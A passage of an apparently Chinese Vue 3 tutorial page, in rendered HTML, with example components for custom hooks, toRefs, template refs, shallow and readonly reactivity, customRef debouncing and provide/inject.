class="line"></span><br><span class="line">    onUnmounted(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onUnmounted&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    return &#123;</span><br><span class="line">      msg,</span><br><span class="line">      update</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;isShow=!isShow&quot;&gt;切换&lt;/button&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;Child v-if=&quot;isShow&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      isShow: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  components: &#123;</span><br><span class="line">    Child</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="自定义hook函数"><a href="#自定义hook函数" class="headerlink" title="自定义hook函数"></a>自定义hook函数</h1><ul><li>使用Vue3的组合API封装的可复用的功能函数</li><li>自定义hook的作用类似于vue2中的mixin技术</li><li>自定义Hook的优势: 很清楚复用功能代码的来源, 更清楚易懂</li></ul><p>例如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, onMounted, onUnmounted &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">收集用户鼠标点击的页面坐标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">useMousePosition</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化坐标数据</span></span><br><span class="line">  <span class="keyword">const</span> x = ref(-<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">const</span> y = ref(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用于收集点击事件坐标的函数</span></span><br><span class="line">  <span class="keyword">const</span> updatePosition = <span class="function">(<span class="params">e: MouseEvent</span>) =&gt;</span> &#123;</span><br><span class="line">    x.value = e.pageX</span><br><span class="line">    y.value = e.pageY</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 挂载后绑定点击监听</span></span><br><span class="line">  onMounted(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>, updatePosition)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 卸载前解绑点击监听</span></span><br><span class="line">  onUnmounted(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.removeEventListener(<span class="string">&#x27;click&#x27;</span>, updatePosition)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;x, y&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在组件中引入并使用自定义hook<br>自定义hook的作用类似于vue2中的mixin技术<br>自定义Hook的优势: 很清楚复用功能代码的来源, 更清楚易懂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;h2&gt;x: &#123;&#123;x&#125;&#125;, y: &#123;&#123;y&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">import &#123;</span><br><span class="line">  ref</span><br><span class="line">&#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">import useMousePosition from &#x27;./hooks/useMousePosition&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line"></span><br><span class="line">    const &#123;x, y&#125; = useMousePosition()</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      x,</span><br><span class="line">      y,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="toRefs"><a href="#toRefs" class="headerlink" title="toRefs"></a>toRefs</h1><p>把一个响应式对象转换成普通对象，该普通对象的每个 property 都是一个 ref</p><p> 当从合成函数返回响应式对象时，toRefs 非常有用，这样消费组件就可以在不丢失响应式的情况下对返回的对象进行分解使用</p><p>reactive 对象取出的所有属性值都是非响应式的可以利用 toRefs 可以将一个响应式 reactive 对象的所有原始属性转换为响应式的 ref 属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;h3&gt;foo: &#123;&#123;foo&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;bar: &#123;&#123;bar&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;foo2: &#123;&#123;foo2&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;bar2: &#123;&#123;bar2&#125;&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, toRefs &#125; from &#x27;vue&#x27;</span><br><span class="line">/*</span><br><span class="line">toRefs:</span><br><span class="line">  将响应式对象中所有属性包装为ref对象, 并返回包含这些ref对象的普通对象</span><br><span class="line">  应用: 当从合成函数返回响应式对象时，toRefs 非常有用，</span><br><span class="line">        这样消费组件就可以在不丢失响应式的情况下对返回的对象进行分解使用</span><br><span class="line">*/</span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line"></span><br><span class="line">    const state = reactive(&#123;</span><br><span class="line">      foo: &#x27;a&#x27;,</span><br><span class="line">      bar: &#x27;b&#x27;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    const stateAsRefs = toRefs(state)</span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      state.foo += &#x27;++&#x27;</span><br><span class="line">      state.bar += &#x27;++&#x27;</span><br><span class="line">    &#125;, 2000);</span><br><span class="line"></span><br><span class="line">    const &#123;foo2, bar2&#125; = useReatureX()</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      // ...state,</span><br><span class="line">      ...stateAsRefs,</span><br><span class="line">      foo2, </span><br><span class="line">      bar2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function useReatureX() &#123;</span><br><span class="line">  const state = reactive(&#123;</span><br><span class="line">    foo2: &#x27;a&#x27;,</span><br><span class="line">    bar2: &#x27;b&#x27;,</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    state.foo2 += &#x27;++&#x27;</span><br><span class="line">    state.bar2 += &#x27;++&#x27;</span><br><span class="line">  &#125;, 2000);</span><br><span class="line"></span><br><span class="line">  return toRefs(state)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="ref获取元素"><a href="#ref获取元素" class="headerlink" title="ref获取元素"></a>ref获取元素</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot;&gt;---</span><br><span class="line">  &lt;input type=&quot;text&quot; ref=&quot;inputRef&quot;&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; onMounted, ref &#125; from &#x27;vue&#x27;</span><br><span class="line">/* </span><br><span class="line">ref获取元素: 利用ref函数获取组件中的标签元素</span><br><span class="line">功能需求: 让输入框自动获取焦点</span><br><span class="line">*/</span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const inputRef = ref&lt;HTMLElement|null&gt;(null)</span><br><span class="line"></span><br><span class="line">    onMounted(() =&gt; &#123;</span><br><span class="line">      inputRef.value &amp;&amp; inputRef.value.focus()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      inputRef</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="readonly-与-shallowReadonly"><a href="#readonly-与-shallowReadonly" class="headerlink" title="readonly 与 shallowReadonly"></a>readonly 与 shallowReadonly</h1><ul><li>shallowReactive : 只处理了对象内最外层属性的响应式(也就是浅响应式)</li><li>shallowRef: 只处理了value的响应式, 不进行对象的reactive处理</li><li>什么时候用浅响应式呢?<ul><li>一般情况下使用ref和reactive即可</li><li>如果有一个对象数据, 结构比较深, 但变化时只是外层属性变化 ===&gt; shallowReactive</li><li>如果有一个对象数据, 后面会产生新的对象来替换 ===&gt; shallowRef</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">  &lt;h3&gt;m1: &#123;&#123;m1&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;m2: &#123;&#123;m2&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;m3: &#123;&#123;m3&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;h3&gt;m4: &#123;&#123;m4&#125;&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">  &lt;button @click=&quot;update&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, ref, shallowReactive, shallowRef &#125; from &#x27;vue&#x27;</span><br><span class="line">/* </span><br><span class="line">shallowReactive与shallowRef</span><br><span class="line">  shallowReactive: 只处理了对象内最外层属性的响应式(也就是浅响应式)</span><br><span class="line">  shallowRef: 只处理了value的响应式, 不进行对象的reactive处理</span><br><span class="line">总结:</span><br><span class="line">  reactive与ref实现的是深度响应式, 而shallowReactive与shallowRef是浅响应式</span><br><span class="line">  什么时候用浅响应式呢?</span><br><span class="line">    一般情况下使用ref和reactive即可,</span><br><span class="line">    如果有一个对象数据, 结构比较深, 但变化时只是外层属性变化 ===&gt; shallowReactive</span><br><span class="line">    如果有一个对象数据, 后面会产生新的对象来替换 ===&gt; shallowRef</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line"></span><br><span class="line">    const m1 = reactive(&#123;a: 1, b: &#123;c: 2&#125;&#125;)</span><br><span class="line">    const m2 = shallowReactive(&#123;a: 1, b: &#123;c: 2&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    const m3 = ref(&#123;a: 1, b: &#123;c: 2&#125;&#125;)</span><br><span class="line">    const m4 = shallowRef(&#123;a: 1, b: &#123;c: 2&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    const update = () =&gt; &#123;</span><br><span class="line">      // m1.b.c += 1</span><br><span class="line">      // m2.b.c += 1</span><br><span class="line"></span><br><span class="line">      // m3.value.a += 1</span><br><span class="line">      m4.value.a += 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      m1,</span><br><span class="line">      m2,</span><br><span class="line">      m3,</span><br><span class="line">      m4,</span><br><span class="line">      update,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="readonly-与-shallowReadonly-1"><a href="#readonly-与-shallowReadonly-1" class="headerlink" title="readonly 与 shallowReadonly"></a>readonly 与 shallowReadonly</h1><ul><li>readonly:<ul><li>深度只读数据</li><li>获取一个对象 (响应式或纯对象) 或 ref 并返回原始代理的只读代理。</li><li>只读代理是深层的：访问的任何嵌套 property 也是只读的。</li></ul></li><li>shallowReadonly<ul><li>浅只读数据</li><li>创建一个代理，使其自身的 property 为只读，但不执行嵌套对象的深度只读转换</li></ul></li><li>应用场景:<ul><li>在某些特定情况下, 我们可能不希望对数据进行更新的操作, 那就可以包装生成一个只读代理对象来读取数据, 而不能修改或删除</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;h3&gt;&#123;&#123;state&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;button @click=&quot;update&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, readonly, shallowReadonly &#125; from &#x27;vue&#x27;</span><br><span class="line">/*</span><br><span class="line">readonly: 深度只读数据</span><br><span class="line">  获取一个对象 (响应式或纯对象) 或 ref 并返回原始代理的只读代理。</span><br><span class="line">  只读代理是深层的：访问的任何嵌套 property 也是只读的。</span><br><span class="line">shallowReadonly: 浅只读数据</span><br><span class="line">  创建一个代理，使其自身的 property 为只读，但不执行嵌套对象的深度只读转换 </span><br><span class="line">应用场景: </span><br><span class="line">  在某些特定情况下, 我们可能不希望对数据进行更新的操作, 那就可以包装生成一个只读代理对象来读取数据, 而不能修改或删除</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line"></span><br><span class="line">    const state = reactive(&#123;</span><br><span class="line">      a: 1,</span><br><span class="line">      b: &#123;</span><br><span class="line">        c: 2</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // const rState1 = readonly(state)</span><br><span class="line">    const rState2 = shallowReadonly(state)</span><br><span class="line"></span><br><span class="line">    const update = () =&gt; &#123;</span><br><span class="line">      // rState1.a++ // error</span><br><span class="line">      // rState1.b.c++ // error</span><br><span class="line"></span><br><span class="line">      // rState2.a++ // error</span><br><span class="line">      rState2.b.c++</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return &#123;</span><br><span class="line">      state,</span><br><span class="line">      update</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="customRef"><a href="#customRef" class="headerlink" title="customRef"></a>customRef</h1><ul><li>创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制</li><li>需求: 使用 customRef 实现 debounce 的示例</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;input v-model=&quot;keyword&quot; placeholder=&quot;搜索关键字&quot;/&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;keyword&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">/*</span><br><span class="line">customRef:</span><br><span class="line">  创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制</span><br><span class="line"></span><br><span class="line">需求: </span><br><span class="line">  使用 customRef 实现 debounce 的示例</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import &#123;</span><br><span class="line">  ref,</span><br><span class="line">  customRef</span><br><span class="line">&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line">    const keyword = useDebouncedRef(&#x27;&#x27;, 500)</span><br><span class="line">    console.log(keyword)</span><br><span class="line">    return &#123;</span><br><span class="line">      keyword</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">实现函数防抖的自定义ref</span><br><span class="line">*/</span><br><span class="line">function useDebouncedRef&lt;T&gt;(value: T, delay = 200) &#123;</span><br><span class="line">  let timeout: number</span><br><span class="line">  return customRef((track, trigger) =&gt; &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        // 告诉Vue追踪数据</span><br><span class="line">        track()</span><br><span class="line">        return value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newValue: T) &#123;</span><br><span class="line">        clearTimeout(timeout)</span><br><span class="line">        timeout = setTimeout(() =&gt; &#123;</span><br><span class="line">          value = newValue</span><br><span class="line">          // 告诉Vue去触发界面更新</span><br><span class="line">          trigger()</span><br><span class="line">        &#125;, delay)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="provide-与-inject"><a href="#provide-与-inject" class="headerlink" title="provide 与 inject"></a>provide 与 inject</h1><ul><li>provide<code>和</code>inject<code>提供依赖注入，功能类似 2.x 的</code>provide/inject</li><li>实现跨层级组件(祖孙)间通信</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;父组件&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;当前颜色: &#123;&#123;color&#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;button @click=&quot;color=&#x27;red&#x27;&quot;&gt;红&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;color=&#x27;yellow&#x27;&quot;&gt;黄&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;color=&#x27;blue&#x27;&quot;&gt;蓝&lt;/button&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;Son /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; provide, ref &#125; from &#x27;vue&#x27;</span><br><span class="line">/* </span><br><span class="line">- provide` 和 `inject` 提供依赖注入，功能类似 2.x 的 `provide/inject</span><br><span class="line">- 实现跨层级组件(祖孙)间通信</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import Son from &#x27;./Son.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;ProvideInject&#x27;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Son</span><br><span class="line">  &#125;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    </span><br><span class="line">    const color = ref(&#x27;red&#x27;)</span><br><span class="line"></span><br><span class="line">    provide(&#x27;color&#x27;, color)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      color</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;子组件&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;GrandSon /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import GrandSon from &#x27;./GrandSon.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    GrandSon</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h3 :style=&quot;&#123;color&#125;&quot;&gt;孙子组件: 